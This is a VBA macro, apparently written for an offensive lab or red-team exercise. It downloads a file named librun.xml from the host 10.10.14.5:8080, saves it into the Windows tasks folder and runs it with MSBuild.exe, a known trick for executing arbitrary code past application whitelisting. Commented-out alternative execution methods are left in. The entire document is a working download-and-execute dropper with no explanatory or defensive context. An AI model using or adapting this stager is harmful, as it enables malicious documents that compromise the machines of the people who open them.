Sub MyMacro()
    Dim URL As String
    Dim filepath As String
    
    filepath = "c:\\windows\\tasks\\librun.xml"
    URL = "http://10.10.14.5:8080/librun.xml"

    Set xhr = CreateObject("MSXML2.XMLHTTP")
    With xhr
        .Open "GET", URL, False
        .Send
    End With
    
    If xhr.Status = 200 Then
        Set fso = CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(filepath) Then fso.DeleteFile (filepath)
        
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write (xhr.ResponseBody)
        stream.Position = 0
        stream.SaveToFile (filepath)
        stream.Close
        
        ' Shell "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe c:\\windows\\tasks\\librun.xml", vbHide
        
        Dim wsh As Object
        Set wsh = VBA.CreateObject("WScript.Shell")
        Dim waitOnReturn As Boolean: waitOnReturn = True
        Dim windowStyle As Integer: windowStyle = 1
        wsh.Run "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe c:\\windows\\tasks\\librun.xml", 1, True
        
        'Dim ws As Object
        'Set ws = CreateObject("WScript.Shell")
        'With ws.Exec("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe c:\\windows\\tasks\\librun.xml")
        '    .StdIn.WriteBlankLines 1
        '    .Terminate
        'End With
    End If
    
End Sub